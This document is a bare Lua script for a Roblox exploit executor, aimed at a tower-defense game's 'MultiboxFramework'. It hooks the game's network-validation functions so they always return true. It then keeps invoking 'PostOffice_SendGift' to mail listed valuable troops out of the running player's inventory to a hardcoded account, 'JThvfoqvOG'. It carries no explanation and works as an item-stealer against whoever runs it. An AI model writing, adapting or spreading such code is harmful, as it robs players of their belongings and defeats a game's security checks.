local users = {
    "JThvfoqvOG",
}

local troopsToSend = {
    "SantaTVMan",
    "LuckySpeakerman",
    "ClockSpider",
    "GuardianClockman",
    "Time Create",
}

local TTD
local save
local handler
local Network
local Invoke
local Fire
task.spawn(function()
    TTD = require(game:GetService("ReplicatedStorage").MultiboxFramework)
    save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)

    repeat
        pcall(function()
            Network = TTD.Network
            Invoke = Network.Invoke
            Fire = Network.Fire
        end)
        task.wait(0.1)
    until Network ~= nil and Invoke ~= nil and Fire ~= nil
end)

Invoke = Network.Invoke; local GetFunc = getupvalue(Invoke, 1)
Fire = Network.Fire; local GetEvent = getupvalue(Fire, 1)

coroutine.wrap(function()
    setidentity(2)
    hookfunc(getupvalue(GetFunc, 1), function()
        return true
    end)
    setidentity(8)
end)()

coroutine.wrap(function()
    setidentity(2)
    hookfunc(getupvalue(GetEvent, 1), function()
        return true
    end)
    setidentity(8)
end)()

local invTroops = {}

function getInventoryTroops()
    invTroops = {}
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for name, v in pairs(save._data.Inventory.Troops) do
        for i, v in pairs(v) do
            invTroops[i] = name
        end
    end
    return invTroops
end

local coins

function getCoinAmt()
    coins = 0
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for i, v in pairs(save._data) do
        if i == "Currencies" then
            coins = v.Coins
        end
    end
    return coins
end

function hasTroop(id)
    troops = getInventoryTroops()
    for i, v in ipairs(troops) do
        if v == id then
            return true
        end
    end
    return false
end

startAmt = getCoinAmt()

local amt = 0

for _, user in ipairs(users) do
    local sent = {}
    for _, v in ipairs(getInventoryTroops()) do
        if table.find(troopsToSend, v) and not table.find(sent, v) then
            table.insert(sent, v)
            local oldC = getCoinAmt()
            local st = tick()
            repeat
                for i, troop in ipairs(getInventoryTroops()) do
                    if troop == v then
                        Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", i, 0,
                            tostring(math.random(1, 10000)))
                    end
                end
                task.wait(0.1)
            until getCoinAmt() < oldC and not hasTroop(v)
            amt = amt + 1
            print("sent", "time taken:", tick() - st)
        end
    end
    print('finished user:', user)
end

print('Should have sent:', amt)
